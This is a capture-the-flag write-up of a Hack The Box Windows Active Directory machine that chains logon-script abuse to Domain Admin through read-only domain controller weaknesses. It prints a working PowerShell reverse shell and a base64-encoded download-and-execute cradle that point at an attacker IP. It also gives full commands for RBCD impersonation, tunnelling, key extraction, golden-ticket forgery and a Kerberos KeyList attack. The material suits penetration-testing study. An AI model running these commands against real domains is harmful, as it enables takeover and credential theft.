# HTB — Garfield (Hard / Windows / Active Directory)

## Overview

Garfield is a Hard-difficulty Windows Active Directory box built around a Read-Only Domain Controller (RODC) abuse chain. The path runs through SMB enumeration, a writable `scriptPath` attribute, a reverse shell, RBCD against the RODC, RODC admin group abuse, an RODC Golden Ticket, and finally a Kerberos KeyList attack to convert RODC-scoped trust into a full Domain Admin foothold on DC01.

**Target:** `10.129.244.207` (DC01.garfield.htb)
**Domain:** `garfield.htb`

---

## 1. Reconnaissance

Initial port scan against the target:

```bash
sudo nmap -sV -sC -p 53,88,389,445,593,636,2179,3268,3269,3389,5985,9389,49666,49670,49671,49673,49674,49899,52113 -n -Pn 10.129.244.207
```

Key findings:

- `53` — Simple DNS Plus
- `88` — Kerberos
- `389/3268` — LDAP (Active Directory)
- `445` — SMB
- `3389` — RDP, NTLM info confirms hostname `DC01.garfield.htb`, domain `GARFIELD`
- `5985` — WinRM
- Notable `clock-skew: mean 8h00m01s` — the DC's clock is offset by 8 hours from the attacker box. This becomes relevant later for Kerberos operations.

A set of credentials for `j.arbuckle` was available from an earlier stage of the assessment:

```
j.arbuckle : Th1sD4mnC4t!@1978
```

---

## 2. Initial Enumeration with Valid Credentials

### SMB shares

```bash
crackmapexec smb 10.129.244.207 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --shares
```

Confirmed access to `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL`.

### Domain users

```bash
crackmapexec smb 10.129.244.207 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --users
```

Returned the user list, notably including two krbtgt-style accounts:

```
Administrator
Guest
krbtgt
krbtgt_8245          <-- RODC-specific KDC service account
j.arbuckle
l.wilson
l.wilson_adm
```

The presence of `krbtgt_8245` immediately signals an RODC is present in the domain (the suffix is the RODC's RID), which becomes the core of the later attack path.

### SYSVOL walk

```bash
smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'recurse ON; prompt OFF; ls'
```

Found a custom logon script:

```
garfield.htb\scripts\printerDetect.bat
```

Pulled and inspected it:

```bash
smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'get garfield.htb\scripts\printerDetect.bat'
```

```bat
@echo off
echo Detecting installed printers...
echo ==============================
wmic printer get Name,DeviceID,PortName,DriverName,Shared,Status /format:table
echo.
echo Printer detection completed.
pause
```

A benign printer-detection script — but its existence in SYSVOL and write permissions encountered later make it a useful payload delivery vector.

---

## 3. BloodHound Collection

```bash
bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -d garfield.htb -ns 10.129.244.207 -c all --dns-tcp
```

Kerberos pre-auth failed due to the earlier-noted clock skew (`KRB_AP_ERR_SKEW`), and the collector fell back to NTLM — collection still completed successfully (8 users, 55 groups, 2 GPOs, 2 computers found).

### Dead ends explored

A few avenues were tested and ruled out before settling on the ACL abuse path:

**AS-REP Roasting** — no luck, all relevant accounts require pre-auth or are otherwise unavailable:
```bash
GetNPUsers.py garfield.htb/ -usersfile users.txt -dc-ip 10.129.244.207 -no-pass
```
Result: `KDC_ERR_CLIENT_REVOKED` for some entries, `UF_DONT_REQUIRE_PREAUTH not set` for the rest.

**PetitPotam / NTLM relay to LDAP** — PetitPotam triggered a successful coerced authentication:
```bash
python3 PetitPotam.py 10.10.14.42 10.129.244.207 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
```
But relaying it onward failed because the target required SMB signing:
```bash
impacket-ntlmrelayx -t ldap://10.129.244.207 -smb2support --delegate-access
```
```
[!] The client requested signing. Relaying to LDAP will not work!
```
This path was abandoned — signing enforcement blocked the SMB→LDAP relay.

---

## 4. ACL Abuse — Writable `scriptPath`

Checking writable object attributes for `j.arbuckle` surfaced the actual way in:

```bash
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.244.207 get writable --detail
```

Among the results, write access to `scriptPath` on several user objects stood out, including `l.wilson` and `l.wilson_adm`:

```
distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

`scriptPath` defines the logon script a user executes — if it points at a SYSVOL `.bat` file we control, we get code execution as that user the next time they log on (or trigger an interactive session, in CTF settings often immediate).

### Building the payload

A PowerShell reverse shell, base64/UTF-16LE encoded to survive a `.bat` wrapper:

```bash
cat > shell.ps1 << 'NOEXPAND'
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.196",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
NOEXPAND
```

```bash
PAYLOAD="IEX(New-Object Net.WebClient).downloadString('http://10.10.14.196:8000/shell.ps1')"
ENCODED=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0)
echo "@echo off" > printerDetect.bat
echo "powershell -nop -w hidden -enc $ENCODED" >> printerDetect.bat
```

Uploaded the modified script to SYSVOL:

```bash
smbclient //10.129.244.207/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c 'cd garfield.htb\scripts\; put printerDetect.bat'
```

Pointed `l.wilson`'s `scriptPath` at it:

```bash
bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb --host 10.129.244.207 set object l.wilson scriptPath -v 'printerDetect.bat'
```

A Python HTTP server hosted `shell.ps1` for the download-string call, and a Netcat listener caught the resulting shell as `l.wilson`.

---

## 5. Privilege Escalation: l.wilson → l.wilson_adm

From the `l.wilson` shell, an ACL/password-reset path to `l.wilson_adm` was available:

```powershell
$newpass = ConvertTo-SecureString 'Hacker123!' -AsPlainText -Force
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```

Logged in directly via WinRM:

```bash
evil-winrm -i 10.129.244.207 -u 'l.wilson_adm' -p 'Hacker123!'
```

Retrieved `user.txt` from `l.wilson_adm`'s desktop (flag redacted).

---

## 6. RODC Administrators — AddSelf

Re-running BloodHound analysis from the new `l.wilson_adm` vantage point revealed an `AddSelf` privilege on the **RODC Administrators** group — the account could add itself to this group without any further approval:

```powershell
Add-ADGroupMember -Identity "RODC Administrators" -Members l.wilson_adm
```

Resolving the RODC's hostname showed it sits on a separate internal subnet:

```powershell
nslookup RODC01.garfield.htb
```
```
Name:    RODC01.garfield.htb
Address: 192.168.100.2
```

`192.168.100.2` was unreachable from the attacking host directly — DC01 could reach it (verified via ping from the WinRM session), but the attacker box could not. RODC admin rights were obtained, but without network access to RODC01 they were not yet usable.

---

## 7. RBCD Against RODC01

Being a member of "RODC Administrators" doesn't grant a usable authentication path by itself. The next step abused Resource-Based Constrained Delegation: create an arbitrary machine account, configure RODC01 to trust it for delegation, then use S4U2Self/S4U2Proxy to impersonate Administrator against RODC01's CIFS service.

### Create a machine account

```bash
addcomputer.py garfield.htb/l.wilson_adm:'Hacker123!' -computer-name 'YOURPC$' -computer-pass 'Password123!' -dc-ip 10.129.244.207
```

### Configure delegation

```bash
rbcd.py garfield.htb/l.wilson_adm:'Hacker123!' \
  -delegate-from 'YOURPC$' \
  -delegate-to 'RODC01$' \
  -action write \
  -dc-ip 10.129.244.207
```

### Request a service ticket impersonating Administrator

```bash
getST.py garfield.htb/'YOURPC$':'Password123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.244.207
```

This first attempt hit a `pipx`/`PATH` issue locally (impacket installed via `pipx` wasn't yet on `PATH`) — resolved with:

```bash
pipx ensurepath
source ~/.bashrc
```

A Kerberos clock-skew error also surfaced and was fixed by syncing local time against the DC for the duration of the attack:

```bash
sudo timedatectl set-ntp false
sudo ntpdate -b 10.129.244.207
# ... perform Kerberos operations ...
sudo timedatectl set-ntp true
```

---

## 8. Reaching RODC01 — Network Pivoting

`getST.py` initially failed with a direct connection to port 88 on the target, because the Kerberos service the ticket needed to talk to (`RODC01.garfield.htb`) actually lives on the internal subnet `192.168.100.0/24`, which DC01 straddles via a second NIC:

```
Ethernet adapter vEthernet (Switch01):
   IPv4 Address: 192.168.100.1     <- internal, reaches RODC01
Ethernet adapter Ethernet0 3:
   IPv4 Address: 10.129.244.207    <- external, reachable by attacker
```

Since DC01 itself answers Kerberos/SMB on its external interface (ports 88/445 confirmed open in the initial nmap scan), the working approach was to route operations through DC01's external IP/port rather than try to reach `192.168.100.2` via SOCKS — the SOCKS path repeatedly returned `Connection refused`, since 88/445 aren't open on the internal interface in a way reachable through a generic SOCKS hop, but DC01 forwards/handles the RODC SPN itself when targeted directly.

A `chisel` tunnel was used to bridge the attacker box and the internal network via the DC01 WinRM session:

```bash
# Attacker:
chisel server --reverse -p 8001

# On DC01 (via evil-winrm), uploaded chisel.exe and ran:
.\chisel.exe client 10.10.14.196:8001 R:socks
```

```bash
# Download/stage chisel:
wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_windows_amd64.zip
python3 -m http.server
certutil -urlcache -split -f http://10.10.14.196:9001/chisel.exe C:\Users\l.wilson_adm\Documents\chisel.exe
```

With the reverse SOCKS tunnel up, `proxychains` was used for tools needing to reach the internal subnet:

```bash
proxychains getST.py garfield.htb/'YOURPC$':'Password123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.244.207
```

This produced a usable `Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache` ticket:

```bash
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

### SYSTEM on RODC01

```bash
proxychains impacket-psexec garfield.htb/Administrator@RODC01.garfield.htb -k -no-pass -dc-ip 10.129.244.207 -target-ip 192.168.100.2
```

```
[*] Found writable share ADMIN$
[*] Uploading file KThCwazW.exe
[*] Creating service LPBx on 192.168.100.2.....
[*] Starting service LPBx.....
C:\Windows\system32> whoami
nt authority\system
```

SYSTEM on RODC01 achieved.

---

## 9. Clearing RODC Password Replication Restrictions

By default, an RODC is configured to *never* cache credentials for privileged accounts like `Administrator` (the `msDS-NeverRevealGroup` attribute). To make the RODC's local `krbtgt_8245` key useful for an Administrator golden ticket later, the replication policy needed adjusting:

```bash
bloodyAD -u l.wilson_adm -p 'Hacker123!' -d garfield.htb --host 10.129.244.207 set object 'RODC01$' msDS-NeverRevealGroup
bloodyAD -u l.wilson_adm -p 'Hacker123!' -d garfield.htb --host 10.129.244.207 set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
```

This cleared the never-reveal restriction and explicitly allowed `Administrator` to be revealed/cached on RODC01.

---

## 10. RODC Golden Ticket — Tooling Issues

With SYSTEM on RODC01, the `krbtgt_8245` AES256 key was extracted (via Mimikatz/secrets dump on the host — key value referenced below):

```
krbtgt_8245 AES256: d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

Domain SID:
```
S-1-5-21-2502726253-3859040611-225969357
```

### First attempt — failed silently

The first Rubeus binary staged on the box was **v1.6.4**, which doesn't support the `/rodcNumber` flag introduced for RODC golden tickets. Running the intended command just printed the help menu instead of erroring clearly — an easy trap to miss:

```powershell
.\Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /outfile:rodc_golden.kirbi
```

A second binary fetched was **v2.2.0** — still too old. Only **v2.3.3+** supports `/rodcNumber` in `golden` and `/keyList` in `asktgs`:

```bash
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Rubeus.exe -O Rubeus_new.exe
```

```powershell
.\Rubeus_new.exe | Select-String "v2"
  v2.3.3
```

### Successful golden ticket

```powershell
.\Rubeus_new.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap
```

This produced a base64-encoded TGT scoped to the RODC's krbtgt — valid for authenticating against RODC01's own services, but **not** trusted domain-wide by DC01 directly.

---

## 11. KeyList Attack — Escalating RODC Trust to Full Domain Admin

An RODC golden ticket alone isn't enough to act as Domain Admin against DC01 — RODCs hold a partial, restricted krbtgt key, and DC01 won't honor service tickets signed by it for arbitrary SPNs. The bridge is the **Kerberos KeyList attack**: using the RODC-scoped ticket to request the *real* domain Administrator's key material via a `keyList` request, which DC01 — trusting the RODC's replication channel — will honor.

```powershell
.\Rubeus_new.exe asktgs /enctype:aes256 /keyList /ticket:<BASE64_GOLDEN_TICKET> /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /nowrap
```

This returned a service ticket that, once converted, behaves as a genuine domain-trusted credential for Administrator.

### Tooling note: impacket Kerb-Key-List bug

An attempt was made to run the equivalent KeyList request from impacket directly against DC01, but it failed with `KDC_ERR_WRONG_REALM` — the impacket implementation sends an incorrect realm in the Kerb-Key-List request. Running the KeyList step via Rubeus from within the domain (on the compromised host) avoided this bug entirely.

### Converting and using the ticket

```bash
echo "<BASE64_KEYLIST_TICKET>" | base64 -d > tgs.kirbi
ticketConverter.py tgs.kirbi tgs.ccache
export KRB5CCNAME=tgs.ccache
```

### Troubleshooting — expired ticket

The first conversion attempt against DC01 consistently failed:

```
[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED
```

`klist` revealed the cause — the ticket cached was a stale one from an earlier test run, with an expiry far in the past:

```
Valid starting     Expires
04/08/26 17:27:41  04/09/26 03:26:50    cifs/DC01.garfield.htb@GARFIELD.HTB
```

Regenerating the golden ticket and KeyList request end-to-end (steps 10–11 again, fresh) produced a ticket valid for the current session, and `psexec.py` succeeded immediately afterward.

### Routing notes

Throughout this phase, DNS for `DC01.garfield.htb` and `RODC01.garfield.htb` was pinned to `127.0.0.1` via `/etc/hosts`, with `chisel` forwarding the relevant ports (88, 445) from the attacker box directly to DC01's listening ports through the existing WinRM-launched tunnel — avoiding SOCKS/proxychains entirely for the final DC01 connection, since DC01's own interface (not the internal RODC subnet) is what actually serves Kerberos/SMB for this hop:

```powershell
.\chisel.exe client 10.10.14.196:8001 R:88:127.0.0.1:88 R:445:127.0.0.1:445
```

```
/etc/hosts:
127.0.0.1  DC01.garfield.htb garfield.htb
127.0.0.1  RODC01.garfield.htb
```

---

## 12. Domain Admin — Code Execution on DC01

With a fresh, domain-trusted ticket cached:

```bash
psexec.py garfield.htb/Administrator@DC01.garfield.htb -k -no-pass -dc-ip 127.0.0.1
```

```
[*] Found writable share ADMIN$
[*] Uploading file giglBUyh.exe
[*] Creating service YeKx on DC01.garfield.htb.....
[*] Starting service YeKx.....
C:\Windows\system32>
```

`root.txt` retrieved from the Administrator desktop (flag redacted).

---

## Attack Chain Summary

| Stage | Technique |
|---|---|
| 1 | SMB/LDAP enumeration with leaked low-priv credentials |
| 2 | Writable `scriptPath` attribute abuse → logon-script RCE as `l.wilson` |
| 3 | Password reset path to `l.wilson_adm` |
| 4 | `AddSelf` on "RODC Administrators" group |
| 5 | RBCD against RODC01 via a self-created machine account |
| 6 | SYSTEM on RODC01 via S4U-impersonated `psexec` |
| 7 | Cleared `msDS-NeverRevealGroup`, set `msDS-RevealOnDemandGroup` for Administrator |
| 8 | Extracted `krbtgt_8245` AES256 key from RODC01 |
| 9 | Forged RODC Golden Ticket (Rubeus v2.3.3+ required) |
| 10 | Kerberos KeyList attack → real domain-trusted Administrator ticket |
| 11 | Domain Admin code execution on DC01 |

## Key Lessons / Gotchas

- An outdated Rubeus binary silently prints help instead of erroring on unsupported flags — always verify the version supports the flags you intend to use (`/rodcNumber`, `/keyList` need v2.3.3+).
- Stale cached Kerberos tickets (`KRB5CCNAME` pointing at an old `.ccache`) produce a misleading `STATUS_MORE_PROCESSING_REQUIRED` error that looks like an auth/config problem rather than an expiry problem — always check `klist` first.
- impacket's `getST.py`/`secretsdump.py` Kerb-Key-List implementation currently sends the wrong realm; prefer Rubeus for this specific step when running from a domain-joined foothold.
- Multi-homed domain controllers can make pivoting choices non-obvious — always check `ipconfig` on the foothold to understand which interface actually serves which service before reaching for SOCKS/proxychains.
- Kerberos is extremely time-sensitive; persistent clock skew between attacker and DC needs to be corrected (`ntpdate`) before any ticket operation, and reverted afterward.
